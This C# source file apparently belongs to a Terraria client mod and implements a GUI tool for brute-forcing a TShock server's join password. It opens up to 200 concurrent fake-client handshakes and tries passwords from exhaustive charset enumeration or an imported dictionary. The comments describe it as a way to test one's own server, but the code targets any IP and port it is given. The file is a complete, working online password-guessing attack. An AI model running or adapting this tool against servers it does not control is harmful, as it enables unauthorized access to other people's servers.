using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Numerics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using ImGuiNET;
using SDL3;              // SDL_ShowOpenFileDialog（绑定在 TNA.dll 内）
using Terraria;
using TerraAngel.Assets;   // ClientAssets.GetMonospaceFont（含思源黑体 CJK merge）
using TerraAngel.UI;

namespace TaDebug.TAPlugin;

/// <summary>
/// 进服密码爆破窗口（安全测试用途：验证自己服务器的进服密码抗暴力破解能力，反哺 TSWeb 反作弊）。
/// 以迷你客户端身份对目标 TShock/Terraria 服务器做并发握手，尝试候选密码。
///
/// ⚠️ 用 ClientWindow 而非 Tool：Tool 的 DrawUI 只在 MainWindow 的"游戏内"分支被调用
///   （MainWindow.cs:31 `if (!Main.gameMenu && ...)`），主菜单不渲染任何 Tool；
///   ClientWindow 渲染循环只检查 IsEnabled（ClientRenderer.cs:309），主菜单同样可显示。
///
/// ⚠️ 协议基准（对齐插件端实测可用的 CrossLoginClient.cs / TransferProtocol.cs）：
///   - 目标：Terraria 1.4.5 / TShock 6.x（与本项目服务器同版本）
///   - 帧格式：[ushort 总长 LE（含 2 字节长度头）][byte 包类型][body...]
///   - 握手序列（每连接一次）：
///       客户端 → 服务器  1 ClientHello(版本串) → 68 ClientUUID（带连字符 GUID，同原版客户端）
///       服务器 → 客户端  3 LoadPlayer(分配槽位)
///       客户端 → 服务器  4 PlayerInfo(槽位+外观) → 6 ContinueConnecting2
///       服务器 → 客户端  37 RequestPassword（设了进服密码） / 7 WorldData（无密码直接进世界）
///       客户端 → 服务器  38 SendPassword(候选密码)
///       服务器 → 客户端  7 WorldData = 密码正确；2 Kick / 断开 = 密码错误
///   - 判定：收到 7 即成功；发 38 后收到 2 或连接中断即失败。
/// </summary>
public sealed class PasswordBruteWindow : ClientWindow
{
    public override string Title => "进服密码爆破";
    public override bool DefaultEnabled => true;   // 默认显示（主菜单/游戏内均可见）
    public override bool IsToggleable => true;     // 右上角可关闭
    public override bool IsGlobalToggle => true;   // 跟随 TerraAngel 全局窗口开关

    // ── 用户输入：目标 ──
    private string _ip = "127.0.0.1";
    private int _port = 7777;
    private int _concurrency = 20;
    private string _version = "";        // 留空自动取 Main.curRelease（"Terraria"+curRelease）

    // ── 用户输入：密码来源（自动生成 / 手动字典）──
    private bool _autoGenerate = true;   // true=程序穷举生成，false=手动字典
    // 自动生成参数
    private bool _useDigits = true;
    private bool _useLower = true;
    private bool _useUpper;
    private bool _useSymbols;
    private int _minLen = 1;
    private int _maxLen = 4;
    // 手动字典
    private string _manualPasswords = "# 每行一个候选密码\n";

    private const string DigitChars = "0123456789";
    private const string LowerChars = "abcdefghijklmnopqrstuvwxyz";
    private const string UpperChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    private const string SymbolChars = "!@#$%^&*()-_=+[]{};:,.<>?/";

    // ── 运行状态（后台线程写，UI 读）──
    private volatile bool _running;
    private volatile bool _noPassword;   // 目标未设进服密码
    private volatile string? _found;
    private volatile string? _stopReason;
    private long _tried;
    private long _total;
    private DateTime _startTime;

    private CancellationTokenSource? _cts;
    private ConcurrentQueue<string>? _queue;   // 手动模式
    private long _autoIndex;                   // 自动模式：下一个待生成的索引
    private string _charset = "";              // 自动模式字符集
    private int _genMinLen = 1, _genMaxLen = 1;

    private readonly ConcurrentQueue<(string msg, bool err, bool ok)> _log = new();
    private readonly List<(string msg, bool err, bool ok)> _logView = new(); // UI 侧渲染缓存

    // ── 字典文件导入（SDL 文件对话框 → 后台读取 → UI 线程合并进手动字典）──
    private static Action<List<string>>? _fileDialogCallback;
    private readonly ConcurrentQueue<string> _importPaths = new();
    private string? _pendingImport;
    private readonly object _importLock = new();

    private static readonly object StartLock = new();

    // ── 控制（DebugPlugin.Unload 调用，防止 #reload 后后台线程泄漏）──
    private static PasswordBruteWindow? _instance;

    public PasswordBruteWindow()
    {
        _instance = this;
    }

    /// <summary>插件卸载时强制停止所有爆破线程。</summary>
    public static void StopAll()
    {
        var inst = _instance;
        inst?.Stop();
    }

    // ═══════════════════════════════════════════════
    //  窗口渲染
    // ═══════════════════════════════════════════════
    public override void Draw(ImGuiIOPtr io)
    {
        // ⚠️ 必须 PushFont：TerraAngel 的中文字体（思源黑体）是 merge 进 MonospaceFont 的，
        // 默认字体（ProggyClean）不含 CJK 字形，不 PushFont 中文会显示为问号
        ImGui.PushFont(ClientAssets.GetMonospaceFont(16f));
        bool open = IsEnabled;
        ImGui.SetNextWindowSize(new Vector2(580, 720), ImGuiCond.FirstUseEver);
        if (ImGui.Begin(Title, ref open))
        {
            ImGui.TextUnformatted("目标服务器（进服密码爆破，Terraria 1.4.5 / TShock 6.x）");

            ImGui.SetNextItemWidth(220f);
            ImGui.InputText("IP 地址", ref _ip, 64);
            ImGui.SameLine();
            ImGui.SetNextItemWidth(100f);
            ImGui.InputInt("端口", ref _port);

            ImGui.SetNextItemWidth(120f);
            ImGui.InputInt("并发数", ref _concurrency);
            if (_concurrency < 1) _concurrency = 1;
            if (_concurrency > 200) _concurrency = 200;
            ImGui.SameLine();
            ImGui.SetNextItemWidth(220f);
            ImGui.InputText("版本串（留空自动取当前客户端）", ref _version, 32);

            // ── 密码来源 ──
            ImGui.Separator();
            ImGui.TextUnformatted("密码来源:");
            ImGui.SameLine();
            if (ImGui.RadioButton("自动生成（穷举）", _autoGenerate)) _autoGenerate = true;
            ImGui.SameLine();
            if (ImGui.RadioButton("手动字典", !_autoGenerate)) _autoGenerate = false;

            if (_autoGenerate)
            {
                ImGui.TextUnformatted("字符集:");
                ImGui.SameLine();
                ImGui.Checkbox("数字", ref _useDigits);
                ImGui.SameLine();
                ImGui.Checkbox("小写", ref _useLower);
                ImGui.SameLine();
                ImGui.Checkbox("大写", ref _useUpper);
                ImGui.SameLine();
                ImGui.Checkbox("符号", ref _useSymbols);

                ImGui.TextUnformatted("长度范围:");
                ImGui.SameLine();
                ImGui.SetNextItemWidth(60f);
                ImGui.InputInt("最小", ref _minLen);
                if (_minLen < 1) _minLen = 1;
                if (_minLen > 12) _minLen = 12;
                ImGui.SameLine();
                ImGui.SetNextItemWidth(60f);
                ImGui.InputInt("最大", ref _maxLen);
                if (_maxLen < 1) _maxLen = 1;
                if (_maxLen > 12) _maxLen = 12;
                if (_maxLen < _minLen) _maxLen = _minLen;
                ImGui.SameLine();
                ImGui.TextUnformatted("(1~12 位，自动递增穷举)");
            }
            else
            {
                ImGui.InputTextMultiline(
                    "候选密码（每行一个）",
                    ref _manualPasswords,
                    131072,
                    new Vector2(ImGui.GetContentRegionAvail().X, 140f));
                if (ImGui.Button("导入字典文件"))
                {
                    OpenDictFileDialog(paths =>
                    {
                        if (paths.Count > 0)
                            _importPaths.Enqueue(paths[0]);
                    });
                }
                ImGui.SameLine();
                ImGui.TextUnformatted("每行一个密码，追加到上方文本框");
            }

            DrainImports();

            // ── 控制按钮 ──
            ImGui.Separator();
            if (!_running)
            {
                if (ImGui.Button("开始爆破", new Vector2(120, 0)))
                    Start();
            }
            else
            {
                if (ImGui.Button("停止", new Vector2(120, 0)))
                    Stop();
                ImGui.SameLine();
                ImGui.TextColored(new Vector4(1f, 0.8f, 0.2f, 1f), "运行中...");
            }

            // ── 状态 ──
            ImGui.TextUnformatted($"进度: {_tried:N0} / {_total:N0}");
            if (_running)
                ImGui.TextUnformatted($"耗时: {(DateTime.UtcNow - _startTime).TotalSeconds:F1}s");

            if (_found != null)
            {
                ImGui.Separator();
                ImGui.TextColored(new Vector4(0.2f, 1f, 0.3f, 1f), $"命中！进服密码: {_found}");
                ImGui.SameLine();
                if (ImGui.Button("复制"))
                {
                    ImGui.SetClipboardText(_found);
                    Log("已复制到剪贴板", false, true);
                }
            }
            else if (_noPassword)
            {
                ImGui.Separator();
                ImGui.TextColored(new Vector4(1f, 0.6f, 0.2f, 1f), "目标服务器未设置进服密码（握手直接进世界）");
            }
            else if (_stopReason != null)
            {
                ImGui.Separator();
                ImGui.TextColored(new Vector4(1f, 0.4f, 0.4f, 1f), $"已停止: {_stopReason}");
            }

            // ── 日志（滚动，仅显示最近 200 条）──
            ImGui.Separator();
            ImGui.TextUnformatted("日志:");
            ImGui.SameLine();
            if (ImGui.Button("复制日志"))
            {
                ImGui.SetClipboardText(string.Join("\n", _logView.Select(l => l.msg)));
                Log("日志已复制到剪贴板", false, true);
            }
            ImGui.SameLine();
            if (ImGui.Button("清空日志"))
            {
                ClearLogs();
            }
            const float logHeight = 220f;
            if (ImGui.BeginChild("##pwdbrute_log", new Vector2(0, logHeight), ImGuiChildFlags.Borders))
            {
                DrainLogQueue();
                if (ImGui.BeginChild("##pwdbrute_log_scroll"))
                {
                    foreach (var (msg, err, ok) in _logView)
                    {
                        var col = err
                            ? new Vector4(1f, 0.45f, 0.45f, 1f)
                            : ok
                                ? new Vector4(0.4f, 1f, 0.5f, 1f)
                                : new Vector4(0.85f, 0.85f, 0.85f, 1f);
                        ImGui.TextColored(col, msg);
                    }
                    if (_logView.Count > 0)
                        ImGui.SetScrollHereY(1f); // 自动滚动到底
                }
                ImGui.EndChild();
            }
            ImGui.EndChild();
        }
        ImGui.End();
        IsEnabled = open; // 用户点右上角关闭 → 窗口隐藏（TerraAngel 全局开关仍可恢复）
        ImGui.PopFont();
    }

    private void DrainLogQueue()
    {
        while (_log.TryDequeue(out var item))
        {
            _logView.Add(item);
            if (_logView.Count > 200)
                _logView.RemoveAt(0);
        }
    }

    // ═══════════════════════════════════════════════
    //  字典文件导入
    // ═══════════════════════════════════════════════
    /// <summary>SDL3 原生文件对话框（与 TerraAngel WorldEditPixelArt 同款实现）。</summary>
    private static void OpenDictFileDialog(Action<List<string>> callback)
    {
        _fileDialogCallback = callback;
        SDL.SDL_ShowOpenFileDialog(FileDialogCallback, IntPtr.Zero, Main.instance.Window.Handle, null, 0, null, false);
    }

    private static unsafe void FileDialogCallback(IntPtr userdata, IntPtr fileList, int filter)
    {
        var callback = _fileDialogCallback;
        _fileDialogCallback = null;
        if (fileList == IntPtr.Zero)
            return;

        var ptr = (byte**)fileList;
        if (*ptr == null)
            return;

        var list = new List<string>();
        while (*ptr != null)
        {
            list.Add(Marshal.PtrToStringUTF8(*ptr) ?? "");
            ptr++;
        }
        callback(list);
    }

    /// <summary>UI 线程每帧调用：路径 → 后台读文件 → 合并进手动字典文本框。</summary>
    private void DrainImports()
    {
        string? path;
        while (_importPaths.TryDequeue(out path))
        {
            var p = path;
            _ = Task.Run(() =>
            {
                try
                {
                    var content = File.ReadAllText(p);
                    lock (_importLock)
                        _pendingImport = content;
                }
                catch (Exception ex)
                {
                    Log($"导入失败: {p} - {ex.Message}", true);
                }
            });
        }

        lock (_importLock)
        {
            if (_pendingImport != null)
            {
                var add = _pendingImport;
                _pendingImport = null;

                if (_manualPasswords.Length > 0 && !_manualPasswords.EndsWith("\n"))
                    _manualPasswords += "\n";
                _manualPasswords += add;

                var count = add.Split(new[] { "\r\n", "\n" }, StringSplitOptions.RemoveEmptyEntries).Length;
                Log($"已导入字典 {count:N0} 行（追加到手动字典）", false, true);
            }
        }
    }

    /// <summary>清空日志（UI 线程调用，先清后台队列再清渲染列表）。</summary>
    private void ClearLogs()
    {
        while (_log.TryDequeue(out _)) { }
        _logView.Clear();
    }

    private void Log(string msg, bool err = false, bool ok = false)
    {
        _log.Enqueue(($"[{DateTime.Now:HH:mm:ss}] {msg}", err, ok));
    }

    // ═══════════════════════════════════════════════
    //  控制
    // ═══════════════════════════════════════════════
    private void Start()
    {
        lock (StartLock)
        {
            if (_running) return;

            if (string.IsNullOrWhiteSpace(_ip))
            {
                Log("IP 地址为空", true);
                return;
            }
            if (_port < 1 || _port > 65535)
            {
                Log($"端口非法: {_port}", true);
                return;
            }
            if (_concurrency < 1) _concurrency = 1;

            var version = string.IsNullOrWhiteSpace(_version)
                ? "Terraria" + Main.curRelease
                : _version.Trim();

            // ── 密码来源准备 ──
            _queue = null;
            _autoIndex = 0;
            _charset = "";
            string sourceDesc;
            if (_autoGenerate)
            {
                var sb = new StringBuilder();
                if (_useDigits) sb.Append(DigitChars);
                if (_useLower) sb.Append(LowerChars);
                if (_useUpper) sb.Append(UpperChars);
                if (_useSymbols) sb.Append(SymbolChars);
                if (sb.Length == 0)
                {
                    Log("字符集为空（请至少勾选一种）", true);
                    return;
                }
                _charset = sb.ToString();
                _genMinLen = _minLen;
                _genMaxLen = _maxLen;
                _total = CalcTotal(_charset.Length, _genMinLen, _genMaxLen);
                sourceDesc = $"自动穷举 [字符集={_charset.Length} {DescribeCharset()}] 长度{_genMinLen}~{_genMaxLen} 空间={_total:N0}";
            }
            else
            {
                var list = _manualPasswords
                    .Replace("\r\n", "\n")
                    .Split('\n')
                    .Select(p => p.Trim())
                    .Where(p => p.Length > 0 && !p.StartsWith("#")) // # 开头视为注释
                    .ToArray();
                if (list.Length == 0)
                {
                    Log("候选密码列表为空", true);
                    return;
                }
                _queue = new ConcurrentQueue<string>(list);
                _total = list.Length;
                sourceDesc = $"手动字典 {list.Length} 条";
            }

            _logView.Clear();
            _tried = 0;
            _found = null;
            _noPassword = false;
            _stopReason = null;
            _startTime = DateTime.UtcNow;
            _running = true;
            _cts = new CancellationTokenSource();

            Log($"开始爆破 {_ip}:{_port}  [{sourceDesc}]  并发={_concurrency}  版本={version}");

            var workers = new Task[_concurrency];
            for (int i = 0; i < _concurrency; i++)
            {
                int w = i;
                workers[i] = Task.Run(() => Worker(w, version, _cts.Token));
            }

            // 后台监视：全部结束后复位状态
            _ = Task.Run(async () =>
            {
                try { await Task.WhenAll(workers); }
                catch { }
                if (!_cts.IsCancellationRequested && _found == null && !_noPassword && _stopReason == null)
                    Log($"全部密码尝试完毕，未找到进服密码（{_total:N0} 个）");
                _running = false;
            });
        }
    }

    private string DescribeCharset()
    {
        var parts = new List<string>();
        if (_useDigits) parts.Add("数字");
        if (_useLower) parts.Add("小写");
        if (_useUpper) parts.Add("大写");
        if (_useSymbols) parts.Add("符号");
        return string.Join("+", parts);
    }

    private void Stop()
    {
        _cts?.Cancel();
        Log("已请求停止（等待当前连接收尾）", false, false);
    }

    // ═══════════════════════════════════════════════
    //  爆破 Worker
    // ═══════════════════════════════════════════════
    private void Worker(int workerId, string version, CancellationToken ct)
    {
        // 每 worker 固定玩家名（短、唯一）+ 固定 UUID（带连字符 GUID，同原版客户端格式，避免格式校验被拒）
        var name = $"pw{workerId}_{Guid.NewGuid():N}".Substring(0, 16);
        var uuid = Guid.NewGuid().ToString();

        while (!ct.IsCancellationRequested)
        {
            string? pwd = GetNextPassword();
            if (pwd == null)
                break; // 穷举完毕 / 手动字典取完

            var r = TryOnce(name, uuid, version, pwd);
            long triedNow = Interlocked.Increment(ref _tried);

            switch (r.Result)
            {
                case AttemptResult.Success:
                    _found = pwd;
                    Log($"命中！密码 = {pwd}（第 {triedNow:N0} 次尝试）", false, true);
                    _cts?.Cancel();
                    return;

                case AttemptResult.NoPassword:
                    _noPassword = true;
                    Log("目标未设进服密码（发 6 后直接收到 WorldData）", false, false);
                    _cts?.Cancel();
                    return;

                case AttemptResult.ConnectFail:
                    _stopReason = $"连接失败: {r.Reason}";
                    Log($"连接失败: {r.Reason}", true);
                    _cts?.Cancel();
                    return;

                case AttemptResult.HandshakeKick:
                    _stopReason = $"服务器拒绝握手: {r.Reason}";
                    Log($"服务器拒绝握手: {r.Reason}", true);
                    if (r.Reason.ToLowerInvariant().Contains("version"))
                        Log("提示：原因含 version，可能是版本不匹配，请在上方填写正确版本串（如 Terraria319）后重试", true);
                    _cts?.Cancel();
                    return;

                case AttemptResult.Fail:
                    // 正常失败（密码错误被踢/超时）：仅在非预期原因时记录，避免刷屏
                    if (r.Log)
                        Log($"{name} 尝试失败: {r.Reason}", true);
                    break;
            }
        }
    }

    /// <summary>取下一个候选密码：手动模式从队列取；自动模式按索引生成（null = 穷举完毕）。</summary>
    private string? GetNextPassword()
    {
        if (_queue != null)
            return _queue.TryDequeue(out var pwd) ? pwd : null;

        long idx = Interlocked.Increment(ref _autoIndex) - 1;
        return PasswordFromIndex(idx, _charset, _genMinLen, _genMaxLen);
    }

    /// <summary>
    /// 索引 → 密码：按长度递增穷举（先试最小长度全部组合，再试长度+1…）。
    /// idx 0 对应 minLen 位全 0 字符，字典序（高位在前）。
    /// </summary>
    private static string? PasswordFromIndex(long idx, string charset, int minLen, int maxLen)
    {
        long b = charset.Length;
        Span<long> pow = stackalloc long[maxLen + 1];
        pow[0] = 1;
        for (int i = 1; i <= maxLen; i++)
            pow[i] = pow[i - 1] > long.MaxValue / b ? long.MaxValue : pow[i - 1] * b;

        for (int len = minLen; len <= maxLen; len++)
        {
            if (idx < pow[len])
            {
                var s = new char[len];
                long v = idx;
                for (int pos = 0; pos < len; pos++)
                {
                    long d = pow[len - 1 - pos];
                    s[pos] = charset[(int)(v / d)];
                    v %= d;
                }
                return new string(s);
            }
            idx -= pow[len];
        }
        return null; // 穷举完毕
    }

    private static long CalcTotal(int baseN, int minLen, int maxLen)
    {
        long b = baseN;
        long total = 0;
        Span<long> pow = stackalloc long[maxLen + 1];
        pow[0] = 1;
        for (int i = 1; i <= maxLen; i++)
            pow[i] = pow[i - 1] > long.MaxValue / b ? long.MaxValue : pow[i - 1] * b;
        for (int len = minLen; len <= maxLen; len++)
        {
            if (total >= long.MaxValue - pow[len])
                return long.MaxValue;
            total += pow[len];
        }
        return total;
    }

    /// <summary>
    /// 域名解析 + TCP 连接（带总超时）。逐个 IP 尝试，任一成功即返回；
    /// 避免 TcpClient.ConnectAsync(域名) 在 .NET 下 IPv6 优先导致连接挂起超时。
    /// </summary>
    private static TcpClient? TryConnect(string host, int port, TimeSpan timeout)
    {
        IPAddress[] ips;
        try
        {
            var dnsTask = Dns.GetHostAddressesAsync(host);
            if (!dnsTask.Wait(timeout))
                return null; // DNS 解析超时
            ips = dnsTask.Result;
        }
        catch
        {
            return null; // DNS 解析失败
        }
        if (ips.Length == 0)
            return null;

        var deadline = DateTime.UtcNow + timeout;
        // IPv4 优先（IPv6 网络不通时避免浪费时间）
        foreach (var ip in ips.OrderByDescending(a => a.AddressFamily == AddressFamily.InterNetwork))
        {
            var c = new TcpClient();
            c.NoDelay = true;
            var remaining = deadline - DateTime.UtcNow;
            if (remaining <= TimeSpan.Zero)
            {
                c.Dispose();
                return null;
            }
            try
            {
                var connTask = c.ConnectAsync(ip, port);
                if (connTask.Wait(remaining))
                {
                    if (c.Connected)
                    {
                        c.ReceiveTimeout = (int)TryTimeout.TotalMilliseconds;
                        c.SendTimeout = (int)TryTimeout.TotalMilliseconds;
                        return c;
                    }
                }
            }
            catch { }
            c.Dispose();
        }
        return null;
    }

    private static readonly TimeSpan TryTimeout = TimeSpan.FromSeconds(6);

    private (AttemptResult Result, string Reason, bool Log) TryOnce(string name, string uuid, string version, string pwd)
    {
        // DNS 解析与 TCP 连接分离：域名解析 + 逐个 IP 尝试（避免 ConnectAsync(域名) 因 IPv6 优先挂起超时）
        var client = TryConnect(_ip, _port, TryTimeout);
        if (client == null)
            return (AttemptResult.ConnectFail, $"无法连接 {_ip}:{_port}（DNS 或 TCP 超时）", true);

        NetworkStream? stream = null;
        try
        {
            stream = client.GetStream();

            // 1) ClientHello(1) + 版本串（对齐 CrossLoginClient）
            WriteFrame(stream, bw =>
            {
                bw.Write((byte)1);
                bw.Write(version);
            });

            // 2) ClientUUID(68)：连接后立即发，带连字符 GUID（对齐 CrossLoginClient 的原版客户端 UUID）
            WriteFrame(stream, bw =>
            {
                bw.Write((byte)68);
                bw.Write(uuid);
            });

            // 3) 等 LoadPlayer(3) → 发 PlayerInfo(4) + ContinueConnecting2(6)
            while (true)
            {
                var pkt = ReadPacket(stream);
                switch (pkt.Type)
                {
                    case 3: // [byte slot][bool ...]
                        var slot = pkt.Body.Length >= 2 ? pkt.Body[1] : (byte)0;
                        WriteFrame(stream, bw => WritePlayerInfo(bw, slot, name));
                        WriteFrame(stream, bw => bw.Write((byte)6));
                        goto waitPassword;
                    case 2:
                        return (AttemptResult.HandshakeKick, SafeKickReason(pkt.Body), true);
                    case 7:
                        return (AttemptResult.NoPassword, "无密码直接进世界", false);
                    default:
                        continue; // StatusText 等忽略
                }
            }

        waitPassword:
            // 4) 等 RequestPassword(37) → 发 SendPassword(38)；或直接 WorldData(7) = 无密码
            while (true)
            {
                var pkt = ReadPacket(stream);
                switch (pkt.Type)
                {
                    case 37:
                        WriteFrame(stream, bw =>
                        {
                            bw.Write((byte)38);
                            bw.Write(pwd);
                        });
                        goto waitResult;
                    case 7:
                        return (AttemptResult.NoPassword, "无密码直接进世界", false);
                    case 2:
                        return (AttemptResult.HandshakeKick, SafeKickReason(pkt.Body), true);
                    default:
                        continue;
                }
            }

        waitResult:
            // 5) 发 38 后：收到 WorldData(7) = 密码正确；Kick(2)/断开/超时 = 失败
            while (true)
            {
                var pkt = ReadPacket(stream);
                switch (pkt.Type)
                {
                    case 7:
                        return (AttemptResult.Success, "", false);
                    case 2:
                        return (AttemptResult.Fail, SafeKickReason(pkt.Body), false); // 正常：密码错误被踢
                    case 129:
                        return (AttemptResult.Success, "", false); // 兜底：连接完成即通过
                    default:
                        continue; // 其他包（StatusText 等）继续等 7
                }
            }
        }
        catch (IOException ex)
        {
            // EOF / ReceiveTimeout：密码错被踢断 / 服务器无响应
            return (AttemptResult.Fail, ex is EndOfStreamException ? "连接断开" : "超时", false);
        }
        catch (Exception ex)
        {
            return (AttemptResult.Fail, ex.Message, true);
        }
        finally
        {
            try { stream?.Dispose(); } catch { }
            try { client.Dispose(); } catch { }
        }
    }

    private enum AttemptResult
    {
        Success,       // 密码正确
        NoPassword,    // 目标无进服密码
        ConnectFail,   // 无法连接（IP/端口错误/服务器未开）
        HandshakeKick, // 握手期被踢（版本/名字/UUID/协议等原因）
        Fail,          // 密码错误被踢 / 超时
    }

    // ═══════════════════════════════════════════════
    //  协议编解码（Terraria 1.4.5，2 字节 ushort 长度头含头）
    // ═══════════════════════════════════════════════
    private static byte[] WrapFrame(Action<BinaryWriter> writeBody)
    {
        using var ms = new MemoryStream();
        using (var bw = new BinaryWriter(ms, Encoding.UTF8, true))
            writeBody(bw);
        var body = ms.ToArray();
        var total = body.Length + 2; // 长度字段 = 整帧总长（含 2 字节前缀）
        var frame = new byte[total];
        frame[0] = (byte)(total & 0xFF);
        frame[1] = (byte)((total >> 8) & 0xFF);
        Buffer.BlockCopy(body, 0, frame, 2, body.Length);
        return frame;
    }

    private static void WriteFrame(NetworkStream s, Action<BinaryWriter> writeBody)
    {
        var frame = WrapFrame(writeBody);
        s.Write(frame, 0, frame.Length);
    }

    /// <summary>PlayerInfo(4)：顺序与 TShock HandlePlayerInfo / TrProtocol SyncPlayer 一致（1.4.5 结构）。</summary>
    private static void WritePlayerInfo(BinaryWriter bw, byte slot, string name)
    {
        bw.Write((byte)4);                      // msgid
        bw.Write(slot);                         // playerid（服务器 LoadPlayer 分配的槽位）
        bw.Write((byte)0);                      // skinVariant
        bw.Write((byte)0);                      // voiceVariant
        bw.Write(0f);                           // voicePitchOffset
        bw.Write((byte)0);                      // hair
        bw.Write(name);                         // string（7bit 长度 + UTF8）
        bw.Write((byte)0);                      // hairDye
        bw.Write((ushort)0);                    // hideVisualFlags
        bw.Write((byte)0);                      // hideMisc
        bw.Write((byte)255); bw.Write((byte)255); bw.Write((byte)255); // hairColor
        bw.Write((byte)255); bw.Write((byte)255); bw.Write((byte)255); // skinColor
        bw.Write((byte)255); bw.Write((byte)255); bw.Write((byte)255); // eyeColor
        bw.Write((byte)255); bw.Write((byte)255); bw.Write((byte)255); // shirtColor
        bw.Write((byte)255); bw.Write((byte)255); bw.Write((byte)255); // underShirtColor
        bw.Write((byte)255); bw.Write((byte)255); bw.Write((byte)255); // pantsColor
        bw.Write((byte)255); bw.Write((byte)255); bw.Write((byte)255); // shoeColor
        bw.Write((byte)0);                      // extra（difficulty=0, 无 extraSlot）
        bw.Write((byte)0);                      // torchFlags
        bw.Write((byte)0);                      // usedXXX 系列
    }

    /// <summary>读一帧：[ushort 总长 LE][body...]，返回 (类型, body 全量)。</summary>
    private static (byte Type, byte[] Body) ReadPacket(NetworkStream s)
    {
        var lenBuf = new byte[2];
        ReadExactly(s, lenBuf, 2);
        var total = lenBuf[0] | (lenBuf[1] << 8);
        if (total < 3 || total > 0xFFFF)
            throw new InvalidDataException($"非法包长度 {total}");
        var body = new byte[total - 2];
        ReadExactly(s, body, body.Length);
        return (body[0], body);
    }

    private static void ReadExactly(NetworkStream s, byte[] buf, int count)
    {
        int read = 0;
        while (read < count)
        {
            var n = s.Read(buf, read, count - read);
            if (n <= 0) throw new EndOfStreamException();
            read += n;
        }
    }

    /// <summary>
    /// Kick(2) 包完整解析：body = [type=2][short playerId][NetworkText]。
    /// NetworkText mode：0=Literal([string])，1=Formattable([string fmt][byte 参数数][递归 NetworkText...])，2=Localized([string key])。
    /// TShock 踢人用 GetString("Kicked: {0}", reason) → mode 1，必须递归解析才能看到原因。
    /// </summary>
    private static string SafeKickReason(byte[] body)
    {
        try
        {
            using var ms = new MemoryStream(body, 1, body.Length - 1);
            using var br = new BinaryReader(ms, Encoding.UTF8);
            br.ReadInt16(); // playerId
            return ReadNetworkText(br, out _);
        }
        catch { return ""; }
    }

    private static string ReadNetworkText(BinaryReader br, out string? format)
    {
        format = null;
        var mode = br.ReadByte();
        switch (mode)
        {
            case 0: // Literal
                return br.ReadString();
            case 2: // Localized（key）
                return br.ReadString();
            case 1: // Formattable
            {
                var fmt = br.ReadString();
                var count = br.ReadByte();
                var args = new List<string>();
                for (int i = 0; i < count; i++)
                    args.Add(ReadNetworkText(br, out _));
                try { return string.Format(fmt, args.ToArray()); }
                catch { return fmt + " [" + string.Join(", ", args) + "]"; }
            }
            default:
                return "";
        }
    }
}
